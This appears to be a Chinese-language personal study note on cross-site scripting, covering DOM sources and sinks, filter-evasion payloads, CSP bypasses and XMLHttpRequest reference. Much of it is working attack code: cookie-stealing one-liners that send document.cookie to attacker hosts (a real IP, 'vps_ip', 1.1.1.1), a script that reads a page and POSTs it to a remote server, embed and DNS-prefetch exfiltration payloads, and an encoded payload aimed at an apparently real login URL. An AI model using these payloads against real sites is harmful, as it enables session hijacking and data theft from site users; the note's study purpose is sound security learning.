# xss

## 推荐网站

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet 

## 近期学习方向

csp，浏览器的xss protect 

dom-xss jsonp

xss 跨域问题

浏览器同源策略

## ssrf

[利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)



## 不同的xss类型

### 反射型xss

### 储存型xss

### dom xss

客户端产生xss

测试技巧:关注输入和输出

**输入:**

document.URL

document.URLUnencoded

document.location

document.referrer

document.xxxx

window.location

window.name

window.xxxxxx

**输出:**

document.write()

document.writeln()

document.body.innerHtml=...

document.forms[0].action=...

document.attachEvent(...)

document.create...(...)

document.execCommand(...)

document.body. ...

window.attachEvent(...)

document.location=...

document.location.hostname=...

document.location.replace(...)

document.location.assign(...)

document.URL=...

window.navigate(...)

document.open(...)

window.open(...)

window.location.href=...

eval(...)

window.execScript(...)

window.setInterval(...)

window.setTimeout(...)







## xss cheat sheet

http://ha.ckers.org/xss.html

https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

## 绕过xss-filter

### html标签属性执行xss

属性:href,lowsrc,src,bgsound,background,value,action,dynsry

### 空格回车,tab

原理:javascript 引擎对语句的解析

```html
<img src="javas
          cript:
          alert(0)"
```

### 对标签属性值的转码

html中属性值本身支持ascii码格式

```html
<img src="javascript:alert(/xss/)">
变为
<img src="javascript&#116&#58alert(/xss/)">
将&#116变为&#000000116也行
还可以将&#01,&#02等支付插入到javascript或vbscript头部
```

### 产生自己的事件

onerror,onerror

### 利用css跨站攻击

```css
<div style="background-image:url(javascript:alert('xss'))"
<style>
body{
    background-image:url("javascript:alert('xss')")
}
</style>
<div style="width:expression(alert('xsss'));">
<style>
@import 'javascript:alert()'
</style>
```

加载css的方式:

- link标签
  `<link rel="stylesheet" href="xxxx.css">`
- @import
  `<style type='text/css'>@import url(xxxx.css);</style>`

### 扰乱过滤规则

```html
<img/src="mar.png" alt="mars">
    样式标签中的/**/和\和\0会被浏览器忽略
    <img src="java/*exp/**/script:alert();*/ression(alert(0))">
    @\i\0m\00p\0000\0000\00000r\000000t "url"
   将css中的关键字进行转码处理,如将e转换成\65
    <p style="xss:\0065xpression(alert(/xss/))">
        
   样式表也支持分析和解释\连接的16进制字符串形式
        <style>BODY{background:\75\72\6c....}</style>
```



## Ajax

Ajax:"异步的javascript和xml",可以不必重新加载网页,而访问其他内容,对于csrf和ssrf都相当有用

### javascript常用函数

#### array.indexof()

#### string.substring()



### XMLHttpRequest对象

获取XMLHttpRequest对象通用代码

```javascript
xmlhttp=false;
function getXMLHttpRequest()
{
    if(window.XMLHttpRequest)
        xmlhttp=new XMLHttpRequest();
    else
    {
    	try
        {
            xmlhttp=new ActiveXObject("Msxml2.XMLHTTP")
        }
        catch (e)
        {
            try
            {
                xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
            }
            catch (e)
            {
                xmlhttp=new false;
            }
        }
    }
}
```

#### XMLHttpRequest对象的方法

- [`XMLHttpRequest.abort()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/abort)

  如果请求已被发送，则立刻中止请求。

- [`XMLHttpRequest.getAllResponseHeaders()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getAllResponseHeaders)

  以字符串的形式返回所有用 [CRLF](https://developer.mozilla.org/en-US/docs/Glossary/CRLF) 分隔的响应头，如果没有收到响应，则返回 `null`。

- [`XMLHttpRequest.getResponseHeader("header")`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getResponseHeader)

  返回包含指定响应头的字符串，如果响应尚未收到或响应中不存在该报头，则返回 `null`。

- [`XMLHttpRequest.open("method","url"[,async,username,password])`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open)

  初始化一个请求。该方法只能在 JavaScript 代码中使用，若要在 native code 中初始化请求，请使用 [`openRequest()`](https://developer.mozilla.org/zh-CN/docs/Mozilla/Tech/XPCOM/Reference/Interface/nsIXMLHttpRequest)。

- [`XMLHttpRequest.overrideMimeType()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/overrideMimeType)

  重写由服务器返回的 MIME 类型。

- [`XMLHttpRequest.send()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/send)

  发送请求。如果请求是异步的（默认），那么该方法将在请求发送后立即返回。

- [`XMLHttpRequest.setRequestHeader()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/setRequestHeader)

  设置 HTTP 请求头的值。您必须在 `open()` 之后、`send()` 之前调用 `setRequestHeader()`方法。

#### XMLHttpRequest对象属性

[`XMLHttpRequest.onreadystatechange`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/onreadystatechange)

当 readyState 属性发生变化时调用的 [`EventHandler`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventHandler)。

[`XMLHttpRequest.readyState`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/readyState) 只读

返回 一个无符号短整型（unsigned short）数字，代表请求的状态码。

[`XMLHttpRequest.response`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/response) 只读

返回一个 [`ArrayBuffer`](https://developer.mozilla.org/zh-CN/docs/Web/API/ArrayBuffer)、[`Blob`](https://developer.mozilla.org/zh-CN/docs/Web/API/Blob)、[`Document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)，或 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，具体是哪种类型取决于 [`XMLHttpRequest.responseType`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseType) 的值。其中包含整个响应体（response body）。

[`XMLHttpRequest.responseText`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseText) 只读

返回一个 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，该 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString) 包含对请求的响应，如果请求未成功或尚未发送，则返回 `null`。

[`XMLHttpRequest.responseType`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseType)

一个用于定义响应类型的枚举值（enumerated value）。

[`XMLHttpRequest.responseURL`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseURL) 只读

返回响应的序列化（serialized）URL，如果该 URL 为空，则返回空字符串。

[`XMLHttpRequest.responseXML`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseXML) 只读

返回一个 [`Document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)，其中包含该请求的响应，如果请求未成功、尚未发送或时不能被解析为 XML 或 HTML，则返回 `null`。

[`XMLHttpRequest.status`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/status) 只读

返回一个无符号短整型（unsigned short）数字，代表请求的响应状态。

[`XMLHttpRequest.statusText`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/statusText) 只读

返回一个 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，其中包含 HTTP 服务器返回的响应状态。与 [`XMLHTTPRequest.status`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHTTPRequest/status) 不同的是，它包含完整的响应状态文本（例如，"`200 OK`"）。

#### 利用XMLHttpRequest对象读取网页并发送到远程服务器

```javascript
 <script language="javascript">
        var xmlhttp;
        function getXMLHttpRequest()
        {
            if(window.XMLHttpRequest)
                xmlhttp=new XMLHttpRequest();
            else
            {
                try
                {
                    xmlhttp=new ActiveXObject("Msxml2.XMLHTTP")
                }
                catch (e)
                {
                    try
                    {
                        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
                    }
                    catch (e)
                    {
                        xmlhttp=new false;
                    }
                }
            }
        }
        function send_info_to_remote(xmlhttp)
        {
            var res=xmlhttp.responseText;
            getXMLHttpRequest();
            xmlhttp.open("POST","http://39.108.164.219:60000",true);
            xmlhttp.onreadystatechange=proccessResponse;
            xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            xmlhttp.send(String(res));
            }
        function proccessResponse()
        {
            if(xmlhttp.readyState==4)
            {
                if(xmlhttp.status==200)
                {
                    send_info_to_remote(xmlhttp);
                }else window.alert("error");
            }
        }
        getXMLHttpRequest();
        xmlhttp.open("GET","http://127.0.0.1/1.html",true);
        xmlhttp.onreadystatechange=proccessResponse;
        xmlhttp.send();
        </script>
```



## 运用dom技术

```javascript
document.getElementById
document.getElementsByName
document.getElementsByTagName
document.getElementsByTagName("h1")[0].getAttribute("id");
document.getElementsByTagName("h1")[0].setAttribute("value","yourname");
document.createAttribute//结合appendChild利用
document.body.appendChild
```



## 常用的xss语句

读cookie:document.location='http://ip或域名/?'+document.cookie

读源码:document.location='http://ip或域名/?'+btoa(document.body.innerHTML)

### 访问网页

```javascript
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///var/www/html/config.php");
```

### 重定向

` document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);`



## **反射型XSS Poc:**

 

**alert()函数过滤：**

```
<script>alert('xss')</script> 
<script>confirm('xss')</script> 
<script>prompt('xss')</script> 
```

 

<script>标签过滤：

```
<a href="onclick=alert('xss')"> click</a>123"><a/href=//www.baidu.com/>XssTest</a>
<img src=# onerror=alert('xss')></img>
<iframe onload=alert('xss')>
```

 

**base64加密**

```
<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
```

 

**setTimeout**

```
<svg/onload=setTimeout('ale'+'rt(1)',0)>
```

 

**过滤双引号**

```
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
```

 

**chrome**

```
<img src ?itworksonchrome?\/onerror = alert(1)>
```

 

**data形式**

```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></object>
<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></embed>
<script src=data:%26comma;alert(1)></script>
```

 

**ontoggle**

```
<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#24050;&#26159;&#40644;&#26127;&#29420;&#33258;&#24833;&#65292;&#19968;&#26525;&#32418;&#26447;&#20986;&#22681;&#26469;&#39;&#41;">
```

 

**frame**

```
<frame src="javascript:alert(1)">
<frame src="javascript:%20%0aalert%20%0d %09(1)">
<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />2134'></textarea><script>alert(/xss/)</script><textarea>
```

 

**url加密绕圆括号**

```
<svg/onload=alert(1)>
<svg onload='JavascRipT:alert%281%29'>
<svg/onload ="location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'">
```

 

 **XSS漏洞利用方式：**



```
<script>window.location="http://www.baidu.com"</script>   重定向钓鱼
<script>window.location="http://1.1.1.1/cookie.php?cookie="+document.cookie;</script>  接受客户端cookie
<script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie; </script> http://login.xxx.com/sso/m/mobile-login.do?next_page=http://m.xxx.com&f=coursek12xss",}});setTimeout(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vZHQzMDEuY29tLzAuanMnOw=='),0);({validate: {//
```

## 利用php语言特性

### php

$_SERVER['PHP_SELF']

其中PHP_SELF可以换为:SCRIPT_URI,QUERY_STRING,PATH_INFO等

例子:

```php
<form method="POST" action="<?php echo $_SERVER('PHP_SELF')?>">
</form>
```



exp:

`http://127.0.0.1/1.php/%22%3e%3cscript%3ealert('xss')%3c/script%3e%3cfoo`





## csp



Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。

CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。

CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。

### 语法

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy

[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) )

![img](https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s)

![img](https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s)





### 绕过

https://evoa.me/index.php/archives/53/

https://hurricane618.me/2018/06/30/csp-bypass-summary/

https://cloud.tencent.com/developer/article/1073911

https://paper.seebug.org/423/



#### Content-Security-Policy: default-src 'self'; script-src 'self' 

找到文件上传点,然后加载js

或者利用jsonp来执行js代码

重定向

#### " Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/static/ "

重定向

如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。

假设static目录下存在一个302文件

```
Static/302.php

<?php Header("location: ".$_GET['url'])?>
```

像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行

```
<script src="static/302.php?url=upload/test.jpg">
```









#### 利用标签来外带数据

##### embed

```javascript
<body><script>
var iframe = eval("document.create\105lement('embed')");
iframe.src="http://39.108.164.219:60005/?"+document.cookie;
eval("document.body.append\103hild(iframe)");</script></body>
```



#####  **Link Prefetch**

在 HTML5 中有一个新特性，[Link Prefetch](https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ)(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度

下面就说下几种可以实现预加载的方式

**prefetch**

一般是通过 link 标签来实现预加载的指

`<link rel="prefetch" href="http://xxx.com">`



但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';



如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie

```javascript


<script>

var i=document.createElement('link');

i.setAttribute('rel','prefetch');

i.setAttribute('href','http://xxx.com?'+document.cookie);

document.head.appendChild(i);

</script>
```







**dns-prefetch**

dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。

`<link rel="dns-prefetch" href="http://xxx.com">`

同样想要在

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';



这种情况下收获 Cookie 的话

```javascript


<script>

	 dcl = document.cookie.split(";");

	 n0 = document.getElementsByTagName("HEAD")[0];



	 for (var i=0; i<dcl.length;i++)

	 {

	       console.log(dcl[i]);

	      n0.innerHTML = n0.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + escape(dcl[i].replace(/\//g, "-")).replace(/%/g, "_") + '.' + location.hostname.replace(/\./g, "-") +  ".wb7g7z.ceye.io\">";

	}

</script>
```



因为域名的命名规则是 [\.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换

然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个[平台](http://ceye.io)

**preconnect**

preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商

利用方式和上面类似

**preload**

preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源

和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求

Content-Security-Policy: default-src 'self'; connect-src *;

然后就是和上面类似的 payload 了

`<link rel="preload" href=http://xxx.com>`

**prerender**

测试了下好像已经不行了，没有 CSP 头也不行

#### csp策略不够严格导致的绕过

```html
<script></script>
<frame></frame>
<object></object>

```



### csp常用网站

 https://csp-evaluator.withgoogle.com/  可以查看csp策略的安全等级



## 劫持form

如何劫持呢？利用两个 HTML5 的有趣属性：

> https://www.w3school.com.cn/tags/att_input_formaction.asp
>
> https://www.w3school.com.cn/tags/att_input_form.asp

 我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单

## xss工具

xss-proxy,xssshell,attackapi,anehta,avws

## xss学习资源

https://github.com/Ph0rse/Awesome-XSS 

[https://blog.csdn.net/qq_35513598/article/details/79861908](qq://txfile/#)

## 练习

先知xss挑战赛 以及Google'xss挑战有能力的话把这两个搞下。

